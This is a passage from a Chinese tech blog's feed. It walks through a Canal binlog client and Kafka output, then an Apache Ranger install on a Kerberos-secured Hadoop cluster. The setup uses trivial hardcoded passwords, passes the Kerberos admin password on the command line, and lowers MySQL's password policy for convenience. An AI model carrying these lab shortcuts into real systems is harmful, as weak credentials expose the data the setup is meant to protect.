class="comment">//TODO 连接</span></span><br><span class="line">            canalConnector.connect();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TODO 订阅数据库</span></span><br><span class="line">            canalConnector.subscribe(<span class="string">"gmall-2021.*"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TODO 获取数据</span></span><br><span class="line">            Message message = canalConnector.get(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TODO 获取Entry集合</span></span><br><span class="line">            List&lt;CanalEntry.Entry&gt; entries = message.getEntries();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TODO 判断集合是否为空,如果为空,则等待一会继续拉取数据</span></span><br><span class="line">            <span class="keyword">if</span> (entries.size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"当次抓取没有数据，休息一会。。。。。。"</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//TODO 遍历entries，单条解析</span></span><br><span class="line">                <span class="keyword">for</span> (CanalEntry.Entry entry : entries) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//1.获取表名</span></span><br><span class="line">                    String tableName = entry.getHeader().getTableName();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//2.获取类型</span></span><br><span class="line">                    CanalEntry.EntryType entryType = entry.getEntryType();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//3.获取序列化后的数据</span></span><br><span class="line">                    ByteString storeValue = entry.getStoreValue();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//4.判断当前entryType类型是否为ROWDATA</span></span><br><span class="line">                    <span class="keyword">if</span> (CanalEntry.EntryType.ROWDATA.equals(entryType)) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//5.反序列化数据</span></span><br><span class="line">                        CanalEntry.RowChange rowChange = CanalEntry.RowChange.parseFrom(storeValue);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//6.获取当前事件的操作类型</span></span><br><span class="line">                        CanalEntry.EventType eventType = rowChange.getEventType();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//7.获取数据集</span></span><br><span class="line">                        List&lt;CanalEntry.RowData&gt; rowDataList = rowChange.getRowDatasList();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//8.遍历rowDataList，并打印数据集</span></span><br><span class="line">                        <span class="keyword">for</span> (CanalEntry.RowData rowData : rowDataList) &#123;</span><br><span class="line"></span><br><span class="line">                            JSONObject beforeData = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                            List&lt;CanalEntry.Column&gt; beforeColumnsList = rowData.getBeforeColumnsList();</span><br><span class="line">                            <span class="keyword">for</span> (CanalEntry.Column column : beforeColumnsList) &#123;</span><br><span class="line">                                beforeData.put(column.getName(), column.getValue());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            JSONObject afterData = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                            List&lt;CanalEntry.Column&gt; afterColumnsList = rowData.getAfterColumnsList();</span><br><span class="line">                            <span class="keyword">for</span> (CanalEntry.Column column : afterColumnsList) &#123;</span><br><span class="line">                                afterData.put(column.getName(), column.getValue());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//数据打印</span></span><br><span class="line">                            System.out.println(<span class="string">"Table:"</span> + tableName +</span><br><span class="line">                                    <span class="string">",EventType:"</span> + eventType +</span><br><span class="line">                                    <span class="string">",Before:"</span> + beforeData +</span><br><span class="line">                                    <span class="string">",After:"</span> + afterData);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">"当前操作类型为："</span> + entryType);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在服务端启动canal：<code>bin/startup.sh</code>，修改数据库进行测试</p><h3 id="2-2-Kafka-模式测试">2.2 Kafka 模式测试</h3><p>修改 canal.properties 中 canal 的输出 model，默认 tcp，改为输出到 kafka</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">######### common argument ############# </span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">canal.id = 1</span><br><span class="line">canal.ip =</span><br><span class="line">canal.port = 11111</span><br><span class="line">canal.metrics.pull.port = 11112</span><br><span class="line">canal.zkServers =</span><br><span class="line"><span class="comment"># flush data to zk</span></span><br><span class="line">canal.zookeeper.flush.period = 1000</span><br><span class="line">canal.withoutNetty = <span class="literal">false</span></span><br><span class="line"><span class="comment"># tcp, kafka, RocketMQ</span></span><br><span class="line">canal.serverMode = kafka</span><br><span class="line"><span class="comment"># flush meta cursor/parse position to fil</span></span><br></pre></td></tr></table></figure><p>修改 Kafka 集群的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##################################################</span></span><br><span class="line"><span class="comment">######### MQ #############</span></span><br><span class="line"><span class="comment">##################################################</span></span><br><span class="line">canal.mq.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092</span><br></pre></td></tr></table></figure><p>修改 <code>instance.properties</code> 输出到 Kafka 的主题以及分区数。注意：默认还是输出到指定 Kafka 主题的一个 kafka 分区，因为多个分区并行可能会打乱 binlog 的顺序 ， 如 果 要 提 高 并 行 度 ， 首 先 设 置 kafka 的 分 区 数 &gt;1, 然 后 设 置<code>canal.mq.partitionHash </code>属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mq config</span></span><br><span class="line">canal.mq.topic=canal_test</span><br><span class="line">canal.mq.partitionsNum=1</span><br><span class="line"><span class="comment"># hash partition config</span></span><br><span class="line"><span class="comment">#canal.mq.partition=0</span></span><br><span class="line"><span class="comment">#canal.mq.partitionHash=mytest.person:id,mytest.role:id</span></span><br></pre></td></tr></table></figure><p>然后启动测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/module/canal/</span><br><span class="line">bin/startup.sh</span><br><span class="line"><span class="comment"># 看到 CanalLauncher 你表示启动成功，同时会创建 canal_test 主题</span></span><br><span class="line">jps</span><br><span class="line"><span class="comment"># 启动 Kafka 消费客户端测试，查看消费情况</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic canal_test</span><br><span class="line"><span class="comment"># 向 MySQL 中插入数据后查看消费者控制台</span></span><br><span class="line">INSERT INTO user_info VALUES(<span class="string">'1001'</span>,<span class="string">'zhangsan'</span>,<span class="string">'male'</span>),(<span class="string">'1002'</span>,<span class="string">'lisi'</span>,<span class="string">'female'</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;实时数据同步之Maxwell和Canal&lt;/h1&gt;
&lt;h1&gt;一、概述&lt;/h1&gt;
&lt;h2 id=&quot;1、实时同步工具概述&quot;&gt;1、实时同步工具概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-Maxwell-概述&quot;&gt;1.1 Maxwell 概述&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;官网地址：&lt;a href=&quot;https://maxwells-daemon.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://maxwells-daemon.io/&quot;&gt;https://maxwells-daemon.io/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Maxwell  是由美国  Zendesk  开源，用  Java  编写的  MySQL  实时抓取软件。 实时读取MySQL 二进制日志 Binlog，并生成 JSON格式的消息，作为生产者发送给  Kafka，Kinesis、RabbitMQ、Redis、Google Cloud Pub/Sub、文件或其它平台的应用程序&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意：1.30.0版本后不在支持JDK8&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>权限管理Ranger详解</title>
    <link href="https://blog.shawncoding.top/posts/a6dba6f0.html"/>
    <id>https://blog.shawncoding.top/posts/a6dba6f0.html</id>
    <published>2024-05-31T08:23:35.000Z</published>
    <updated>2024-05-31T08:36:01.923Z</updated>
    
    <content type="html"><![CDATA[<h1>权限管理Ranger详解</h1><h1>一、Ranger概述与安装</h1><h2 id="1、Ranger概述">1、Ranger概述</h2><h3 id="1-1-Ranger介绍">1.1 Ranger介绍</h3><blockquote><p>Ranger的官网：<a href="https://ranger.apache.org/" target="_blank" rel="noopener" title="https://ranger.apache.org/">https://ranger.apache.org/</a></p></blockquote><p>Apache Ranger是一个Hadoop平台上的全方位数据安全管理框架，它可以为整个Hadoop生态系统提供全面的安全管理。</p><p>随着企业业务的拓展，企业可能在多用户环境中运行多个工作任务，这就需要一个可以对安全策略进行集中管理，配置和监控用户访问的框架。Ranger由此产生</p><a id="more"></a><h3 id="1-2-Ranger的目标">1.2 Ranger的目标</h3><ul><li>允许用户使用UI或REST API对所有和安全相关的任务进行集中化的管理</li><li>允许用户使用一个管理工具对操作Hadoop体系中的组件和工具的行为进行细粒度的授权</li><li>支持Hadoop体系中各个组件的授权认证标准</li><li>增强了对不同业务场景需求的授权方法支持，例如基于角色的授权或基于属性的授权</li><li>支持对Hadoop组件所有涉及安全的审计行为的集中化管理</li></ul><h3 id="1-3-Ranger支持的框架">1.3 Ranger支持的框架</h3><ul><li>Apache Hadoop</li><li>Apache Hive</li><li>Apache HBase</li><li>Apache Storm</li><li>Apache Knox</li><li>Apache Solr</li><li>Apache Kafka</li><li>YARN</li><li>NIFI</li></ul><h3 id="1-4-Ranger的架构">1.4 Ranger的架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646030.png" alt></p><h3 id="1-5-Ranger的工作原理">1.5 Ranger的工作原理</h3><p>Ranager的核心是Web应用程序，也称为RangerAdmin模块，此模块由管理策略，审计日志和报告等三部分组成。</p><p>管理员角色的用户可以通过RangerAdmin提供的web界面或REST APIS来定制安全策略。这些策略会由Ranger提供的轻量级的针对不同Hadoop体系中组件的插件来执行。插件会在Hadoop的不同组件的核心进程启动后，启动对应的插件进程来进行安全管理</p><h2 id="2、Ranger安装">2、Ranger安装</h2><p>Ranger2.0要求对应的Hadoop为3.x以上，Hive为3.x以上版本，JDK为1.8以上版本。<strong>Hadoop及Hive等需开启用户认证功能，本文基于开启Kerberos安全认证的Hadoop和Hive环境</strong>。注：本文中所涉及的Ranger相关组件均安装在hadoop102节点</p><h3 id="2-1-创建系统用户和Kerberos主体">2.1 创建系统用户和Kerberos主体</h3><p>Ranger的启动和运行需使用特定的用户，故须在Ranger所在节点创建所需系统用户并在Kerberos中创建所需主体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建ranger系统用户</span></span><br><span class="line">useradd  ranger -G hadoop</span><br><span class="line"><span class="built_in">echo</span> ranger | passwd --stdin ranger</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查HTTP主体是否正常（该主体在Hadoop开启Kerberos时已创建）</span></span><br><span class="line"><span class="comment"># 使用keytab文件认证HTTP主体</span></span><br><span class="line">kinit -kt /etc/security/keytab/spnego.service.keytab HTTP/hadoop102@EXAMPLE.COM</span><br><span class="line"><span class="comment"># 查看认证状态</span></span><br><span class="line">klist</span><br><span class="line">kdestroy </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建rangeradmin主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey rangeradmin/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/rangeradmin.keytab rangeradmin/hadoop102"</span></span><br><span class="line">chown ranger:ranger /etc/security/keytab/rangeradmin.keytab</span><br><span class="line"><span class="comment"># 创建rangerlookup主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey rangerlookup/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/rangerlookup.keytab rangerlookup/hadoop102"</span></span><br><span class="line">chown ranger:ranger /etc/security/keytab/rangerlookup.keytab</span><br><span class="line"><span class="comment"># 创建rangerusersync主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey rangerusersync/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/rangerusersync.keytab rangerusersync/hadoop102"</span></span><br><span class="line">chown ranger:ranger /etc/security/keytab/rangerusersync.keytab</span><br></pre></td></tr></table></figure><h3 id="2-2-数据库环境准备">2.2 数据库环境准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br><span class="line"><span class="comment"># 在MySQL数据库中创建Ranger存储数据的数据库</span></span><br><span class="line">create database ranger;</span><br><span class="line"><span class="comment"># 更改mysql密码策略，为了可以采用比较简单的密码</span></span><br><span class="line"><span class="built_in">set</span> global validate_password_length=4;</span><br><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="comment"># 创建用户</span></span><br><span class="line">grant all privileges on ranger.* to ranger@<span class="string">'%'</span>  identified by <span class="string">'ranger'</span>;</span><br></pre></td></tr></table></figure><h3 id="2-3-安装RangerAdmin">2.3 安装RangerAdmin</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官网：https://ranger.apache.org/</span></span><br><span class="line"><span class="comment"># 在hadoop102的/opt/module路径上创建一个ranger</span></span><br><span class="line"><span class="comment"># https://www.apache.org/dyn/closer.lua/ranger/2.0.0/apache-ranger-2.0.0.tar.gz</span></span><br><span class="line"><span class="comment"># 使用Maven命令编译，注意需要python,maven,git,java环境</span></span><br><span class="line"><span class="comment"># 具体编译可以参考：https://blog.csdn.net/weixin_38586230/article/details/105725346</span></span><br><span class="line">mvn -DskipTests=<span class="literal">true</span> clean package</span><br><span class="line"><span class="comment"># 资源获取：https://download.csdn.net/download/lemon_TT/87961006</span></span><br><span class="line">mkdir /opt/module/ranger</span><br><span class="line">tar -zxvf ranger-2.0.0-admin.tar.gz -C /opt/module/ranger</span><br><span class="line"><span class="comment"># 进入/opt/module/ranger/ranger-2.0.0-admin路径，对install.properties配置</span></span><br><span class="line">vim install.properties</span><br><span class="line"><span class="comment"># ===================================================</span></span><br><span class="line"><span class="comment"># 修改以下配置内容：</span></span><br><span class="line"><span class="comment">#mysql驱动</span></span><br><span class="line">SQL_CONNECTOR_JAR=/opt/software/mysql-connector-java-5.1.37.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">#mysql的主机名和root用户的用户名密码</span></span><br><span class="line">db_root_user=root</span><br><span class="line">db_root_password=123456</span><br><span class="line">db_host=hadoop102</span><br><span class="line"></span><br><span class="line"><span class="comment">#ranger需要的数据库名和用户信息，和2.2.1创建的信息要一一对应</span></span><br><span class="line">db_name=ranger</span><br><span class="line">db_user=ranger</span><br><span class="line">db_password=ranger</span><br><span class="line"></span><br><span class="line"><span class="comment">#Ranger各组件的admin用户密码</span></span><br><span class="line">rangerAdmin_password=atguigu123</span><br><span class="line">rangerTagsync_password=atguigu123</span><br><span class="line">rangerUsersync_password=atguigu123</span><br><span class="line">keyadmin_password=atguigu123</span><br><span class="line"></span><br><span class="line"><span class="comment">#ranger存储审计日志的路径，默认为solr，这里为了方便暂不设置</span></span><br><span class="line">audit_store=</span><br><span class="line"></span><br><span class="line"><span class="comment">#策略管理器的url,rangeradmin安装在哪台机器，主机名就为对应的主机名</span></span><br><span class="line">policymgr_external_url=http://hadoop102:6080</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动ranger admin进程的linux用户信息</span></span><br><span class="line">unix_user=ranger</span><br><span class="line">unix_user_pwd=ranger</span><br><span class="line">unix_group=ranger</span><br><span class="line"></span><br><span class="line"><span class="comment">#Kerberos相关配置</span></span><br><span class="line">spnego_principal=HTTP/hadoop102@EXAMPLE.COM</span><br><span class="line">spnego_keytab=/etc/security/keytab/spnego.service.keytab</span><br><span class="line">admin_principal=rangeradmin/hadoop102@EXAMPLE.COM</span><br><span class="line">admin_keytab=/etc/security/keytab/rangeradmin.keytab</span><br><span class="line">lookup_principal=rangerlookup/hadoop102@EXAMPLE.COM</span><br><span class="line">lookup_keytab=/etc/security/keytab/rangerlookup.keytab</span><br><span class="line">hadoop_conf=/opt/module/hadoop-3.1.3/etc/hadoop</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/opt/module/ranger/ranger-2.0.0-admin目录下执行安装脚本</span></span><br><span class="line">./setup.sh</span><br><span class="line"><span class="comment"># 若安装过程中发现Error executing: CREATE FUNCTION `getXportalUIdByLoginId`(input_val VARCHAR(100)) RETURNS int(11) BEGIN DECLARE myid INT; SELECT x_portal_user.id into myid FROM x_portal_user WHERE x_portal_user.login_id = input_val; RETURN myid; END</span></span><br><span class="line"><span class="comment"># 导入失败，log_bin_trust_function_creators 为 OFF</span></span><br><span class="line"><span class="comment"># 进入mysql进行设置</span></span><br><span class="line">show variables like <span class="string">'%func%'</span>;</span><br><span class="line"><span class="built_in">set</span> global log_bin_trust_function_creators=1;</span><br><span class="line">drop database ranger;</span><br><span class="line">create database ranger;</span><br><span class="line"><span class="comment"># 最后重新安装</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改/opt/module/ranger/ranger-2.0.0-admin/conf/ranger-admin-site.xml配置文件中的以下属性</span></span><br><span class="line">vim /opt/module/ranger/ranger-2.0.0-admin/conf/ranger-admin-site.xml</span><br></pre></td></tr></table></figure><p>修改如下参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>ranger.jpa.jdbc.password<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>ranger<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>ranger.service.host<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-4-启动RangerAdmin">2.4 启动RangerAdmin</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动ranger-admin（以ranger用户启动）</span></span><br><span class="line">sudo -i -u ranger ranger-admin start</span><br><span class="line"><span class="comment"># ranger-admin在安装时已经配设置为开机自启动，因此之后无需再手动启动</span></span><br><span class="line">jps</span><br><span class="line"><span class="comment"># 进程名字为EmbeddedServer</span></span><br><span class="line"><span class="comment"># 访问Ranger的WebUI，地址为：http://hadoop102:6080,账号密码admin/atguigu123</span></span><br><span class="line"><span class="comment"># 停止ranger（此处不用执行）</span></span><br><span class="line">sudo -i -u ranger ranger-admin stop</span><br></pre></td></tr></table></figure><h1>二、Ranger简单使用</h1><blockquote><p><a href="https://cwiki.apache.org/confluence/display/RANGER/Row-level+filtering+and+column-masking+using+Apache+Ranger+policies+in+Apache+Hive" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/RANGER/Row-level+filtering+and+column-masking+using+Apache+Ranger+policies+in+Apache+Hive">https://cwiki.apache.org/confluence/display/RANGER/Row-level+filtering+and+column-masking+using+Apache+Ranger+policies+in+Apache+Hive</a></p></blockquote><h2 id="1、安装-RangerUsersync">1、安装 RangerUsersync</h2><h3 id="1-1-RangerUsersync简介">1.1 RangerUsersync简介</h3><p>RangerUsersync作为Ranger提供的一个管理模块，可以将Linux机器上的用户和组信息同步到RangerAdmin的数据库中进行管理</p><h3 id="1-2-RangerUsersync安装">1.2 RangerUsersync安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxvf ranger-2.0.0-usersync.tar.gz -C /opt/module/ranger/</span><br><span class="line"><span class="comment"># 在/opt/module/ranger/ranger-2.0.0-usersync目录下修改以下文件</span></span><br><span class="line">vim install.properties</span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment">#rangeradmin的url</span></span><br><span class="line">POLICY_MGR_URL =http://hadoop102:6080</span><br><span class="line"></span><br><span class="line"><span class="comment">#同步间隔时间，单位(分钟)</span></span><br><span class="line">SYNC_INTERVAL = 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行此进程的linux用户</span></span><br><span class="line">unix_user=ranger</span><br><span class="line">unix_group=ranger</span><br><span class="line"></span><br><span class="line"><span class="comment">#rangerUserSync用户的密码，参考rangeradmin中install.properties的配置</span></span><br><span class="line">rangerUsersync_password=atguigu123</span><br><span class="line"></span><br><span class="line"><span class="comment">#Kerberos相关配置</span></span><br><span class="line">usersync_principal=rangerusersync/hadoop102@EXAMPLE.COM</span><br><span class="line">usersync_keytab=/etc/security/keytab/rangerusersync.keytab</span><br><span class="line">hadoop_conf=/opt/module/hadoop-3.1.3/etc/hadoop</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/opt/module/ranger/ranger-2.0.0-usersync目录下执行安装脚本</span></span><br><span class="line">./setup.sh</span><br><span class="line"><span class="comment"># 修改/opt/module/ranger/ranger-2.0.0-usersync/conf/ranger-ugsync-site.xml配置文件中的以下参数</span></span><br><span class="line">&lt;property&gt;</span><br><span class="line">      &lt;name&gt;ranger.usersync.enabled&lt;/name&gt;</span><br><span class="line">      &lt;value&gt;<span class="literal">true</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><h3 id="1-3-RangerUsersync启动">1.3 RangerUsersync启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动之前，在ranger admin的web-UI界面，http://hadoop102:6080/index.html#!/users/usertab</span></span><br><span class="line"><span class="comment"># 启动RangerUserSync（使用ranger用户启动）</span></span><br><span class="line">sudo -i -u ranger ranger-usersync start</span><br><span class="line"><span class="comment"># 启动后，再次查看用户信息</span></span><br><span class="line"><span class="comment"># 说明ranger-usersync工作正常！</span></span><br><span class="line"><span class="comment"># ranger-usersync服务也是开机自启动的，因此之后不需要手动启动</span></span><br></pre></td></tr></table></figure><h2 id="2、安装Ranger-Hive-plugin">2、安装Ranger Hive-plugin</h2><h3 id="2-1-Ranger-Hive-plugin简介">2.1 Ranger Hive-plugin简介</h3><p>Ranger Hive-plugin是Ranger对hive进行权限管理的插件。需要注意的是，Ranger Hive-plugin只能对使用jdbc方式访问hive的请求进行权限管理，hive-cli并不受限制</p><h3 id="2-2-Ranger-Hive-plugin安装">2.2 Ranger Hive-plugin安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压软件</span></span><br><span class="line">tar -zxvf ranger-2.0.0-hive-plugin.tar.gz -C /opt/module/ranger/</span><br><span class="line"><span class="comment"># 配置软件</span></span><br><span class="line">vim install.properties</span><br><span class="line"><span class="comment"># 修改以下内容</span></span><br><span class="line"><span class="comment"># ===================================</span></span><br><span class="line"><span class="comment">#策略管理器的url地址</span></span><br><span class="line">POLICY_MGR_URL=http://hadoop102:6080</span><br><span class="line"></span><br><span class="line"><span class="comment">#组件名称</span></span><br><span class="line">REPOSITORY_NAME=hive</span><br><span class="line"></span><br><span class="line"><span class="comment">#hive的安装目录</span></span><br><span class="line">COMPONENT_INSTALL_DIR_NAME=/opt/module/hive</span><br><span class="line"></span><br><span class="line"><span class="comment">#hive组件的启动用户</span></span><br><span class="line">CUSTOM_USER=hive</span><br><span class="line"></span><br><span class="line"><span class="comment">#hive组件启动用户所属组</span></span><br><span class="line">CUSTOM_GROUP=hadoop</span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line"><span class="comment"># 启用Ranger 